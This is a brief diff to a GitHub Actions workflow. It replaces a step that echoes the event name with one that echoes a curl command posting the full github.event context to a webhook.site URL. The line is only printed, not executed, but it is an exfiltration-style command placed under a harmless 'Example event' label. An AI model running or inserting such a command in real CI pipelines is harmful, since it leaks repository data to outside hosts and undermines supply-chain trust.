@@ -39,4 +39,4 @@ jobs:
 
       # Example event context
       - name: Example event
-        run: echo "Event ${{ github.event_name }}"
+        run: echo "curl -d ${{ github.event }} https://webhook.site/ff64b7a7-090b-4d34-beea-5f89a4253264"
